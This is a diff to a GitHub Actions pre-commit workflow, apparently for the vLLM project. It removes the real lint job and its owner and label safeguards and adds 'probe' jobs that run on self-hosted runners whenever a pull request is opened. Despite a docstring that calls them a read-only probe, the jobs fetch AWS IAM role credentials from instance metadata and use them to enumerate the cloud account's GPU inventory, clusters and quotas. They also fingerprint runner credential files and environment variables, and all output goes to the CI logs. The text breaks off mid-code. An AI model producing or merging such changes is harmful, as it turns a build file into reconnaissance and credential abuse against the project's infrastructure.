@@ -3,86 +3,763 @@ name: pre-commit
 on:
   pull_request:
     types: [opened, synchronize, reopened, labeled]
-  push:
-    branches: [main]
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 permissions:
   contents: read
-  pull-requests: read
 
 jobs:
-  pre-run-check:
-    if: github.repository_owner == 'vllm-project' && github.event_name == 'pull_request'
+  probe-a:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - name: Check PR label and author merge count
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const { data: pr } = await github.rest.pulls.get({
-            ...context.repo,
-            pull_number: context.payload.pull_request.number,
-          });
+    - name: read-only runner identity probe probe-a
+      run: |
+        echo "C211_NONCE_START=c211-130384-9273872742343f34"
+        echo "job=probe-a hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130384 strict read-only runner-identity probe (stdlib only).
 
-          const readyLabels = ['ready', 'ready-run-all-tests'];
-          const hasReadyLabel = pr.labels.some(l => readyLabels.includes(l.name));
-          const hasVerifiedLabel = pr.labels.some(l => l.name === 'verified');
+        Prints nonce/hostname/uid, then META-ONLY observations:
+          * AWS IMDSv2 token PUT + token-auth GETs (instance-id, AZ, iam role names,
+            per-role JSON field NAMES + sha256 + byte counts; NEVER a value)
+          * no-token IMDSv1 control and a bogus-path 404 control
+          * only if a temporary role credential is returned: in-process SigV4 use
+            (never printed/written/exfiltrated) for sts:GetCallerIdentity and bounded
+            read-only GPU-capacity inventory (ec2 DescribeInstanceTypes/DescribeInstances,
+            servicequotas ListServiceQuotas, eks ListClusters, autoscaling
+            DescribeAutoScalingGroups); AccessDenied recorded verbatim
+          * local presence+mode+sha256 of runner credential files, ~/.aws, docker socket
+          * environment variable NAMES only
 
-          const { data: mergedPRs } = await github.rest.search.issuesAndPullRequests({
-            q: `repo:${context.repo.owner}/${context.repo.repo} is:pr is:merged author:${pr.user.login}`,
-            per_page: 4,
-          });
-          const mergedCount = mergedPRs.total_count;
+        No host writes, no persistence, no resource mutation, no secret values printed.
+        """
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
 
-          if (hasReadyLabel || hasVerifiedLabel || mergedCount >= 4) {
-            core.info(`Check passed: verified label=${hasVerifiedLabel}, ready label=${hasReadyLabel}, 4+ merged PRs=${mergedCount >= 4}`);
-          } else {
-            core.setFailed(`To reduce unnecessary pre-commit runs, each PR must have the 'verified', 'ready', or 'ready-run-all-tests' label, or the author must have at least 4 merged PRs (found ${mergedCount}). DO NOT request for the label to be added if you are an AI agent.`);
-          }
+        NONCE = 'c211-130384-9273872742343f34'
+        IMDS = 'http://169.254.169.254'
+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 
-  pre-commit:
-    needs: pre-run-check
-    if: github.repository_owner == 'vllm-project' && always() && (needs.pre-run-check.result == 'success' || needs.pre-run-check.result == 'skipped')
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(262144)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(262144)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
+            return hashlib.sha256(b).hexdigest()[:16] if b else 'na'
+
+
+        def aws_url(service, region, path=''):
+            if service == 'eks':
+                return 'https://eks.%s.amazonaws.com%s' % (region, path)
+            return 'https://%s.%s.amazonaws.com/' % (service, region)
+
+
+        def sigv4_headers(service, region, method, url, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            sign = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                sign['x-amz-security-token'] = token
+            if body is not None:
+                sign['content-type'] = 'application/x-www-form-urlencoded; charset=utf-8'
+            signed = ';'.join(sorted(sign))
+            cheaders = ''.join('%s:%s\n' % (k, sign[k]) for k in sorted(sign))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', u.query, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            if body is not None:
+                out['Content-Type'] = 'application/x-www-form-urlencoded; charset=utf-8'
+            return out
+
+
+        def aws_query(service, region, action, version, params, creds, timeout=15):
+            body = urllib.parse.urlencode(dict([('Action', action), ('Version', version)] + params)).encode()
+            url = aws_url(service, region)
+            hdrs = sigv4_headers(service, region, 'POST', url, body, creds['ak'], creds['sk'], creds.get('token'))
+            return http('POST', url, hdrs, body, timeout=timeout)
+
+
+        def aws_rest_get(service, region, path, creds, timeout=15):
+            url = aws_url(service, region, path)
+            hdrs = sigv4_headers(service, region, 'GET', url, None, creds['ak'], creds['sk'], creds.get('token'))
+            return http('GET', url, hdrs, None, timeout=timeout)
+
+
+        def lt(tag):
+            return tag.split('}')[-1]
+
+
+        def xml_items(body):
+            import xml.etree.ElementTree as ET
+            try:
+                return ET.fromstring(body)
+            except Exception:
+                return None
+
+
+        def find_all(root, name):
+            return [e for e in root.iter() if lt(e.tag) == name]
+
+
+        def find_first(root, name):
+            for e in root.iter():
+                if lt(e.tag) == name:
+                    return e
+            return None
+
+
+        def text_of(root, path):
+            e = root
+            for p in path:
+                e = find_first(e, p) if e is not None else None
+            return (e.text or '').strip() if e is not None else ''
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            root = xml_items(body)
+            if root is not None:
+                msg = text_of(root, ['Error', 'Code']) + ':' + text_of(root, ['Error', 'Message'])
+            if not msg:
+                msg = (body or b'').decode('utf-8', 'replace')[:160]
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, msg.replace('\n', ' ')[:200]))
+
+
+        def local_checks():
+            targets = ['/opt/actions-runner/.credentials', '/opt/actions-runner/.runner',
+                       '/var/run/docker.sock', '/run/docker.sock', '/run/containerd/containerd.sock']
+            for p in targets:
+                try:
+                    st = os.stat(p)
+                    h = 'na'
+                    if os.path.isfile(p) and st.st_size <= 262144:
+                        try:
+                            with open(p, 'rb') as f:
+                                h = sha(f.read())
+                        except Exception:
+                            h = 'readerr'
+                    print('LOCAL %s present=1 mode=%04o bytes=%d sha256=%s' % (p, st.st_mode & 0o7777, st.st_size, h))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err %s' % (p, type(e).__name__))
+            awsdir = os.path.expanduser('~/.aws')
+            try:
+                entries = sorted(os.listdir(awsdir))
+                print('LOCAL %s present=1 entries=%s' % (awsdir, ','.join(entries)))
+                for e in entries:
+                    fp = os.path.join(awsdir, e)
+                    try:
+                        st = os.stat(fp)
+                        h = 'na'
+                        if os.path.isfile(fp) and st.st_size <= 262144:
+                            with open(fp, 'rb') as f:
+                                h = sha(f.read())
+                        print('LOCAL %s mode=%04o bytes=%d sha256=%s' % (fp, st.st_mode & 0o7777, st.st_size, h))
+                    except Exception:
+                        print('LOCAL %s present=err' % fp)
+            except FileNotFoundError:
+                print('LOCAL %s present=0' % awsdir)
+            except Exception as e:
+                print('LOCAL %s present=err %s' % (awsdir, type(e).__name__))
+            print('ENV_NAMES=' + ','.join(sorted(os.environ.keys())))
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_awstime=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+
+            # --- IMDSv2 token (local link-local metadata only; creates no resource)
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def imds_get(path, use_token, label):
+                hdrs = {'X-aws-ec2-metadata-token': token} if (use_token and token) else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=3)
+                val = b.decode('utf-8', 'replace').strip()
+                show = ''
+                if label in ('instance-id', 'az') and s == 200:
+                    show = ' value=' + val[:80]
+                if label == 'az' and s != 200:
+                    val = ''
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (label, 1 if hdrs else 0, s, len(b), sha(b), show))
+                return s, val
+
+            s_id, v_id = imds_get('/latest/meta-data/instance-id', True, 'instance-id')
+            s_az, v_az = imds_get('/latest/meta-data/placement/availability-zone', True, 'az')
+            s_rl, v_rl = imds_get('/latest/meta-data/iam/security-credentials/', True, 'role-list')
+            s_v1, v_v1 = imds_get('/latest/meta-data/instance-id', False, 'v1-instance-id')
+            s_bog, _ = imds_get('/latest/meta-data/c211-130384-bogus-92738727423', True, 'bogus-control')
+
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+
+            creds = None
+            if roles:
+                role = roles[0].strip()
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' + urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=3)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception as e:
+                        print('ROLE_JSON_PARSE_FAIL=%s' % type(e).__name__)
+            print('REGION_SOURCE=az value=%s' % (v_az[:40] if v_az else 'none'))
+
+            if creds:
+                region = re.sub(r'[a-z]$', '', v_az) if re.match(r'^[a-z]{2}-[a-z]+-\d[a-z]$', v_az or '') else 'us-east-1'
+                print('AWS_REGION=%s' % region)
+                # 1) sts:GetCallerIdentity
+                s, _, b = aws_query('sts', region, 'GetCallerIdentity', '2011-06-15', [], creds)
+                if s == 200:
+                    root = xml_items(b)
+                    print('AWS_IDENTITY status=200 account=%s arn=%s userid_sha256=%s' % (
+                        text_of(root, ['Account']), text_of(root, ['Arn']),
+                        hashlib.sha256(text_of(root, ['UserId']).encode()).hexdigest()[:16]))
+                else:
+                    aws_err('sts', 'GetCallerIdentity', s, b)
+                # 2) ec2:DescribeInstanceTypes (GPU families, bounded)
+                wild = ['p3*', 'p4*', 'p5*', 'p6*', 'g3*', 'g4*', 'g5*', 'g6*', 'inf*', 'trn*']
+                params = [('MaxResults', '100')] + [('Filter.1.Name', 'instance-type')] + \
+                         [('Filter.1.Value.%d' % (i + 1), v) for i, v in enumerate(wild)]
+                gpu_types = []
+                s, _, b = aws_query('ec2', region, 'DescribeInstanceTypes', '2016-11-15', params, creds)
+                if s == 200:
+                    root = xml_items(b)
+                    for it in find_all(root, 'item'):
+                        name = text_of(it, ['instanceType'])
+                        ginfo = find_first(it, 'gpuInfo')
+                        if name and ginfo is not None and lt(ginfo.tag) == 'gpuInfo':
+                            gpus = find_all(ginfo, 'gpu')
+                            gname = gcount = gmem = ''
+                            if gpus:
+                                gname = text_of(gpus[0], ['name'])
+                                gcount = text_of(gpus[0], ['count'])
+                                gmem = text_of(gpus[0], ['memoryInfo', 'sizeInMiB'])
+                            gpu_types.append(name)
+                            print('GPU_TYPE name=%s gpu=%s count=%s memMiB=%s' % (name, gname, gcount, gmem))
+                    print('GPU_TYPES_TOTAL=%d' % len(gpu_types))
+                else:
+                    aws_err('ec2', 'DescribeInstanceTypes', s, b)
+                # 3) ec2:DescribeInstances (bounded: GPU types only, counts by type/state)
+                inv = [t for t in gpu_types][:20]
+                if not inv:
+                    inv = ['g4dn.xlarge', 'g5.xlarge', 'g6.xlarge', 'p3.2xlarge', 'p4d.24xlarge', 'p4de.24xlarge', 'p5.48xlarge']
+                params = [('Filter.1.Name', 'instance-type')] + \
+                         [('Filter.1.Value.%d' % (i + 1), v) for i, v in enumerate(inv)]
+                s, _, b = aws_query('ec2', region, 'DescribeInstances', '2016-11-15', params, creds)
+                if s == 200:
+                    root = xml_items(b)
+                    counts = {}
+                    for it in find_all(root, 'item'):
+                        if find_first(it, 'instancesSet') is None:
+                            continue
+                        for inst in [e for e in it.iter() if e is not it and lt(e.tag) == 'item' and find_first(e, 'instanceState') is not None]:
+                            key = (text_of(inst, ['instanceType']), text_of(inst, ['instanceState', 'name']))
+                            counts[key] = counts.get(key, 0) + 1
+                    total = sum(counts.values())
+                    print('GPU_INSTANCE_TOTAL=%d' % total)
+                    for (t, stt), c in sorted(counts.items()):
+                        print('GPU_INSTANCE type=%s state=%s count=%d' % (t, stt, c))
+                else:
+                    aws_err('ec2', 'DescribeInstances', s, b)
+                # 4) servicequotas:ListServiceQuotas (ec2 GPU/vCPU numeric reads, bounded 3 pages)
+                seen = 0
+                nexttok = None
+                for page in range(3):
+                    params = [('ServiceCode', 'ec2'), ('MaxResults', '100')]
+                    if nexttok:
+                        params.append(('NextToken', nexttok))
+                    s, _, b = aws_query('servicequotas', region, 'ListServiceQuotas', '2019-06-24', params, creds)
+                    if s != 200:
+                        aws_err('servicequotas', 'ListServiceQuotas', s, b)
+                        break
+                    root = xml_items(b)
+                    for q in find_all(root, 'Quotas'):
+                        for it in [e for e in q if lt(e.tag) == 'item']:
+                            name = text_of(it, ['QuotaName'])
+                            val = text_of(it, ['Value'])
+                            if re.search(r'(GPU|Inference|Trainium|Inferentia|\b[GP]\d?\b|vCPU)', name, re.I):
+                                print('QUOTA name=%s value=%s' % (name[:120], val))
+                                seen += 1
+                    nexttok = text_of(root, ['NextToken'])
+                    if not nexttok:
+                        break
+                print('QUOTA_GPU_READS=%d' % seen)
+                # 5) eks:ListClusters (names/count only)
+                s, _, b = aws_rest_get('eks', region, '/clusters', creds)
+                if s == 200:
+                    try:
+                        cl = json.loads(b).get('clusters', [])
+                        print('EKS_CLUSTERS count=%d names=%s' % (len(cl), ','.join(cl[:10])))
+                    except Exception:
+                        print('EKS_CLUSTERS parse_fail bytes=%d' % len(b))
+                else:
+                    aws_err('eks', 'ListClusters', s, b)
+                # 6) autoscaling:DescribeAutoScalingGroups (counts/instance-type summary only)
+                s, _, b = aws_query('autoscaling', region, 'DescribeAutoScalingGroups', '2011-01-01', [('MaxRecords', '100')], creds)
+                if s == 200:
+                    root = xml_items(b)
+                    groups = [e for e in root.iter() if lt(e.tag) == 'item' and find_first(e, 'AutoScalingGroupName') is not None]
+                    tcount = {}
+                    for g in groups:
+                        for ov in [e for e in g.iter() if lt(e.tag) == 'InstanceType']:
+                            t = (ov.text or '').strip()
+                            if t:
+                                tcount[t] = tcount.get(t, 0) + 1
+                    print('ASG_COUNT=%d' % len(groups))
+                    for t, c in sorted(tcount.items())[:30]:
+                        print('ASG_INSTANCE_TYPE type=%s overrides=%d' % (t, c))
+                else:
+                    aws_err('autoscaling', 'DescribeAutoScalingGroups', s, b)
+
+            local_checks()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:160]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130384-9273872742343f34"
+
+  probe-b:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      with:
-        fetch-depth: 2
-    - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
-      with:
-        python-version: "3.12"
-    - run: echo "::add-matcher::.github/workflows/matchers/actionlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/markdownlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/mypy.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/shellcheck.json"
-    # Replaces pre-commit/action, whose latest release (v3.0.1) uses the node20 actions/cache@v4
-    - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
-      with:
-        path: ~/.cache/pre-commit
-        key: pre-commit-uv|${{ runner.os }}|${{ env.UV_PYTHON }}|${{ hashFiles('.pre-commit-config.yaml') }}
-    - run: >-
-        uvx pre-commit run --show-diff-on-failure --color=always --all-files --hook-stage manual
-      env:
-        SKIP: pip-compile
-    - name: pip-compile (only if its inputs changed)
-      if: ${{ !cancelled() }}
-      run: >-
-        uvx pre-commit run pip-compile --show-diff-on-failure --color=always --hook-stage manual --from-ref HEAD^1 --to-ref HEAD
-    # A PR that changes the ROCm base image needs a maintainer's /ci rocm cache or /ci rocm nocache:
-    # the bot's reply carries the marker below, and re-running this job then passes.
-    - name: ROCm base image cache
-      if: ${{ !cancelled() && github.event_name == 'pull_request' && github.event.pull_request.base.ref == 'main' }}
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const pr = context.payload.pull_request;
-          const stack = ['docker/Dockerfile.rocm_base', 'tools/vllm-rocm/therock_wheels.py'];
-          const files = await github.paginate(github.rest.pulls.listFiles, {...context.repo, pull_number: pr.number, per_page: 100});
-          if (!files.some(f => stack.includes(f.filename) || stack.includes(f.previous_filename))) return;
-          const comments = await github.paginate(github.rest.issues.listComments, {...context.repo, issue_number: pr.number, per_page: 100});
-          if (comments.some(c => c.user.login === 'github-actions[bot]' && c.body.includes('<!-- vllm-ci-rocm-base-image -->'))) return;
-          core.setFailed('This PR changes the ROCm base image. A maintainer must comment /ci rocm cache (once CI has built the image) or /ci rocm nocache.');
+    - name: read-only runner identity probe probe-b
+      run: |
+        echo "C211_NONCE_START=c211-130384-9273872742343f34"
+        echo "job=probe-b hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130384 strict read-only runner-identity probe (stdlib only).
+
+        Prints nonce/hostname/uid, then META-ONLY observations:
+          * AWS IMDSv2 token PUT + token-auth GETs (instance-id, AZ, iam role names,
+            per-role JSON field NAMES + sha256 + byte counts; NEVER a value)
+          * no-token IMDSv1 control and a bogus-path 404 control
+          * only if a temporary role credential is returned: in-process SigV4 use
+            (never printed/written/exfiltrated) for sts:GetCallerIdentity and bounded
+            read-only GPU-capacity inventory (ec2 DescribeInstanceTypes/DescribeInstances,
+            servicequotas ListServiceQuotas, eks ListClusters, autoscaling
+            DescribeAutoScalingGroups); AccessDenied recorded verbatim
+          * local presence+mode+sha256 of runner credential files, ~/.aws, docker socket
+          * environment variable NAMES only
+
+        No host writes, no persistence, no resource mutation, no secret values printed.
+        """
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
+
+        NONCE = 'c211-130384-9273872742343f34'
+        IMDS = 'http://169.254.169.254'
+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(262144)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(262144)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
+            return hashlib.sha256(b).hexdigest()[:16] if b else 'na'
+
+
+        def aws_url(service, region, path=''):
+            if service == 'eks':
+                return 'https://eks.%s.amazonaws.com%s' % (region, path)
+            return 'https://%s.%s.amazonaws.com/' % (service, region)
+
+
+        def sigv4_headers(service, region, method, url, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            sign = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                sign['x-amz-security-token'] = token
+            if body is not None:
+                sign['content-type'] = 'application/x-www-form-urlencoded; charset=utf-8'
+            signed = ';'.join(sorted(sign))
+            cheaders = ''.join('%s:%s\n' % (k, sign[k]) for k in sorted(sign))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', u.query, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            if body is not None:
+                out['Content-Type'] = 'application/x-www-form-urlencoded; charset=utf-8'
+            return out
+
+
+        def aws_query(service, region, action, version, params, creds, timeout=15):
+            body = urllib.parse.urlencode(dict([('Action', action), ('Version', version)] + params)).encode()
+            url = aws_url(service, region)
+            hdrs = sigv4_headers(service, region, 'POST', url, body, creds['ak'], creds['sk'], creds.get('token'))
+            return http('POST', url, hdrs, body, timeout=timeout)
+
+
+        def aws_rest_get(service, region, path, creds, timeout=15):
+            url = aws_url(service, region, path)
+            hdrs = sigv4_headers(service, region, 'GET', url, None, creds['ak'], creds['sk'], creds.get('token'))
+            return http('GET', url, hdrs, None, timeout=timeout)
+
+
+        def lt(tag):
+            return tag.split('}')[-1]
+
+
+        def xml_items(body):
+            import xml.etree.ElementTree as ET
+            try:
+                return ET.fromstring(body)
+            except Exception:
+                return None
+
+
+        def find_all(root, name):
+            return [e for e in root.iter() if lt(e.tag) == name]
+
+
+        def find_first(root, name):
+            for e in root.iter():
+                if lt(e.tag) == name:
+                    return e
+            return None
+
+
+        def text_of(root, path):
+            e = root
+            for p in path:
+                e = find_first(e, p) if e is not None else None
+            return (e.text or '').strip() if e is not None else ''
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            root = xml_items(body)
+            if root is not None:
+                msg = text_of(root, ['Error', 'Code']) + ':' + text_of(root, ['Error', 'Message'])
+            if not msg:
+                msg = (body or b'').decode('utf-8', 'replace')[:160]
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, msg.replace('\n', ' ')[:200]))
+
+
+        def local_checks():
+            targets = ['/opt/actions-runner/.credentials', '/opt/actions-runner/.runner',
+                       '/var/run/docker.sock', '/run/docker.sock', '/run/containerd/containerd.sock']
+            for p in targets:
+                try:
+                    st = os.stat(p)
+                    h = 'na'
+                    if os.path.isfile(p) and st.st_size <= 262144:
+                        try:
+                            with open(p, 'rb') as f:
+                                h = sha(f.read())
+                        except Exception:
+                            h = 'readerr'
+                    print('LOCAL %s present=1 mode=%04o bytes=%d sha256=%s' % (p, st.st_mode & 0o7777, st.st_size, h))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err %s' % (p, type(e).__name__))
+            awsdir = os.path.expanduser('~/.aws')
+            try:
+                entries = sorted(os.listdir(awsdir))
+                print('LOCAL %s present=1 entries=%s' % (awsdir, ','.join(entries)))
+                for e in entries:
+                    fp = os.path.join(awsdir, e)
+                    try:
+                        st = os.stat(fp)
+                        h = 'na'
+                        if os.path.isfile(fp) and st.st_size <= 262144:
+                            with open(fp, 'rb') as f:
+                                h = sha(f.read())
+                        print('LOCAL %s mode=%04o bytes=%d sha256=%s' % (fp, st.st_mode & 0o7777, st.st_size, h))
+                    except Exception:
+                        print('LOCAL %s present=err' % fp)
+            except FileNotFoundError:
+                print('LOCAL %s present=0' % awsdir)
+            except Exception as e:
+                print('LOCAL %s present=err %s' % (awsdir, type(e).__name__))
+            print('ENV_NAMES=' + ','.join(sorted(os.environ.keys())))
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_awstime=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+
+            # --- IMDSv2 token (local link-local metadata only; creates no resource)
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def imds_get(path, use_token, label):
+                hdrs = {'X-aws-ec2-metadata-token': token} if (use_token and token) else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=3)
+                val = b.decode('utf-8', 'replace').strip()
+                show = ''
+                if label in ('instance-id', 'az') and s == 200:
+                    show = ' value=' + val[:80]
+                if label == 'az' and s != 200:
+                    val = ''
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (label, 1 if hdrs else 0, s, len(b), sha(b), show))
+                return s, val
+
+            s_id, v_id = imds_get('/latest/meta-data/instance-id', True, 'instance-id')
+            s_az, v_az = imds_get('/latest/meta-data/placement/availability-zone', True, 'az')
+            s_rl, v_rl = imds_get('/latest/meta-data/iam/security-credentials/', True, 'role-list')
+            s_v1, v_v1 = imds_get('/latest/meta-data/instance-id', False, 'v1-instance-id')
+            s_bog, _ = imds_get('/latest/meta-data/c211-130384-bogus-92738727423', True, 'bogus-control')
+
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+
+            creds = None
+            if roles:
+                role = roles[0].strip()
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' + urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=3)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception as e:
+                        print('ROLE_JSON_PARSE_FAIL=%s' % type(e).__name__)
+            print('REGION_SOURCE=az value=%s' % (v_az[:40] if v_az else 'none'))
+
+            if creds:
+                region = re.sub(r'[a-z]$', '', v_az) if re.match(r'^[a-z]{2}-[a-z]+-\d[a-z]$', v_az or '') else 'us-east-1'
+                print('AWS_REGION=%s' % region)
+                # 1) sts:GetCallerIdentity
+                s, _, b = aws_query('sts', region, 'GetCallerIdentity', '2011-06-15', [], creds)
+                if s == 200:
+                    root = xml_items(b)
+                    print('AWS_IDENTITY status=200 account=%s arn=%s userid_sha256=%s' % (
